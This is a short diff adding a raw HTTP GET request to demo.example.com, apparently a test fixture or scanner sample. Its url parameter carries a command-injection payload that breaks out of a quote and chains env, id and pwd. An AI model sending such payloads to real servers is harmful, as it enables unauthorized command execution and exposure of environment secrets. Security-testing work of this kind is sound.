@@ -1,0 +1,4 @@
+GET /a?url=';%20env;%20id;%20pwd' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
